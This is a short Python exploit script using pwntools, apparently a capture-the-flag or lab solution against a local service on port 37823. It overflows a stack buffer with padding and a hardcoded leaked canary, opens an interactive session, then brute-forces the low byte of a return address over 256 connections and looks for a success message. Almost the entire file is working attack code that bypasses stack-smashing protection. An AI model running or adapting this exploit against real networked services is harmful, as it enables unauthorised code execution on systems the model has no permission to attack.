from pwn import *\

#io.sendline(b"touch test.txt")
#io.recv()
ret_addr = 0x00401682
port = 37823
canary_save = b'\x00~r\xb6\xf4\x0b\x99\x85\x04\x00\x00\x00\x00\x00\x00\x00\x17\x19\x40'
canary = b'\x00~r\xb6\xf4\x0b\x99\x85\x04\x00\x00\x00\x00\x00\x00\x00\x8c\x16\x40'

io = remote('0.0.0.0', int(port))
closing_message = 0x00401518
io.send(b"A"*0x18 + canary)
io.interactive()
io.recv()
io.sendline(b"exit")
io.close()

for i in range(256):
    try:
        log.success("checking " + str(i))
        io = remote('0.0.0.0', int(port))
        print(b"sending " + b"A"*0x18 + canary + i.to_bytes(1, 'little'))
        io.send(b"A"*0x18 + canary + i.to_bytes(1, 'little'))
        io.recv(timeout = 5)
        io.sendline("exit")
        line = io.recvall(timeout = 0.1)
        print(line)
        io.close()
        if (b"Exiting." in line):
            print("Found SUC")
            #exit(0)
    finally:
        try:
            io.close()
        except:
            pass
exit(0)
